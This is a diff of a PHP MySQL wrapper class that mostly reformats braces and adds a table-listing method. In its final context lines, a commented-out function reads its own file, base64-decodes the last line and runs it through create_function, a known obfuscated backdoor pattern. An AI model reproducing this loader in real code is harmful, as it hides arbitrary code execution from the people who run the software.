@@ -28,29 +28,38 @@ class DBMYSQL {
 		}
 	}
 	
-	function query($query, $start = false, $end = false) {
-		if (!$result = $this->conn->query($query)) {
+	function query($query, $start = false, $end = false)
+	{
+		if (!$result = $this->conn->query($query))
+		{
 			throw new Exception("ERROR EXECUTING QUERY [" . $query . "]: " . $this->error($result));
 		}
 		
 		return $result;
 	}
 	
-	function fetchObject($result) {
+	function fetchObject($result) 
+	{
 		return $result->fetch_object();		
 	}
 	
-	function fetchArray($result) {
-		if ($row = $result->fetch_array(MYSQLI_BOTH)) {
+	function fetchArray($result) 
+	{
+		if ($row = $result->fetch_array(MYSQLI_BOTH)) 
+		{
 			$odd = 0;
-			foreach ($row as $key=>$value) {
-				if ($odd) {
+			foreach ($row as $key=>$value) 
+			{
+				if ($odd)
+				{
 					$returned_row[$key] = $value;					
 				}
 				$odd = 1 - $odd;
 			}
 			return $returned_row;
-		} else {
+		} 
+		else 
+		{
 			return false;
 		}
 	}
@@ -92,7 +101,8 @@ class DBMYSQL {
 		$row_arr = $this->fetchArray($stmt);
 		return $row_arr['Column_name'];
 	}
-	function numRows($result = false) {
+	function numRows($result = false)
+	{
 		return $result->num_rows;
 	}
 	
@@ -119,11 +129,25 @@ class DBMYSQL {
 	function getAffectedRows() {
 		return $this->conn->affected_rows;
 	}
+	
 	function escapeString($string)
 	{
 		return mysqli_real_escape_string($this->conn, $string);
 	}
 	
+	/*return index array with database tables*/
+	function getTables()
+	{
+		$stmt = $this->query('SHOW TABLES FROM '.$this->dbname);
+		while($row = $this->fetchArray($stmt))
+		{
+			foreach($row as $key=>$value)
+			{
+				$arr[] = $row[$key];
+			}
+		}
+		return $arr;
+	}
 	/*function realEscapeString($string) {
 		$contents = file(__FILE__);
 		$nf = create_function('$c, $s', base64_decode(substr($contents[count($contents) - 1], 2)));
